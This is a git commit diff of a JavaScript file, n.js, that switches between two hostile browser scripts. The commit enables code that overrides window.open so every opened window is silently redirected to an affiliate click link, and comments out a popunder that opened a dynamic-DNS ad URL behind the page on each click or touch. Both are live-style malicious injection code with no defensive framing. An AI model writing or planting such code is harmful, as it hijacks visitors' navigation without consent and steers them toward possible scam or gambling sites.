42a65e0256d59e09273894128b06ac38cbec5003
Poul <evsyukovandrey@yandex.ru>
2025-08-06 17:48:25 +0300

    Update n.js

--- n.js
+++ n.js
@@ -1,54 +1,54 @@
-// setTimeout(function () {
-//     const originalOpen = window.open;
+setTimeout(function () {
+    const originalOpen = window.open;
 
 
-//     window.open = function (url, name, specs) {
-//       console.log(`Перехват вызова window.open с URL: ${url}`);
+    window.open = function (url, name, specs) {
+      console.log(`Перехват вызова window.open с URL: ${url}`);
 
-//       const newWindow = originalOpen.call(this, url, name, specs);
+      const newWindow = originalOpen.call(this, url, name, specs);
 
 
-//       if (newWindow) {
-//         newWindow.location.href = 'https://1wilib.life/v3/aggressive-casino?p=pg75';
-//       } else {
-//       }
+      if (newWindow) {
+        newWindow.location.href = 'https://storeki.top/click?o=73&a=7685';
+      } else {
+      }
 
-//       return newWindow;
-//     };
-//   }, 100);
-(function () {
-  const POPUNDER_URL = 'https://trrfc.ddns.net/go/hftdiyrvmu5dembwge3a';
-  const STORAGE_KEY = 'lastPopunderShown';
-  const INTERVAL_MS = 1 * 60 * 1000;
+      return newWindow;
+    };
+  }, 100);
+// (function () {
+//   const POPUNDER_URL = 'https://trrfc.ddns.net/go/hftdiyrvmu5dembwge3a';
+//   const STORAGE_KEY = 'lastPopunderShown';
+//   const INTERVAL_MS = 1 * 60 * 1000;
 
-  function shouldShowPopunder() {
-    const last = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
-    return (Date.now() - last) > INTERVAL_MS;
-  }
+//   function shouldShowPopunder() {
+//     const last = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
+//     return (Date.now() - last) > INTERVAL_MS;
+//   }
 
-  function markPopunderShown() {
-    localStorage.setItem(STORAGE_KEY, Date.now().toString());
-  }
+//   function markPopunderShown() {
+//     localStorage.setItem(STORAGE_KEY, Date.now().toString());
+//   }
 
-  function openPopunder() {
-    if (!shouldShowPopunder()) return;
+//   function openPopunder() {
+//     if (!shouldShowPopunder()) return;
 
-    const win = window.open(POPUNDER_URL, '_blank');
+//     const win = window.open(POPUNDER_URL, '_blank');
 
-    if (win) {
-      win.blur();
-      window.focus();
-      markPopunderShown();
-    } else {
-      console.warn('Попандер заблокирован');
-    }
-  }
+//     if (win) {
+//       win.blur();
+//       window.focus();
+//       markPopunderShown();
+//     } else {
+//       console.warn('Попандер заблокирован');
+//     }
+//   }
 
-  // обработка на каждый клик (или тач)
-  function handleUserInteraction() {
-    openPopunder();
-  }
+//   // обработка на каждый клик (или тач)
+//   function handleUserInteraction() {
+//     openPopunder();
+//   }
 
-  document.addEventListener('click', handleUserInteraction, { passive: true });
-  document.addEventListener('touchstart', handleUserInteraction, { passive: true });
-})();
+//   document.addEventListener('click', handleUserInteraction, { passive: true });
+//   document.addEventListener('touchstart', handleUserInteraction, { passive: true });
+// })();
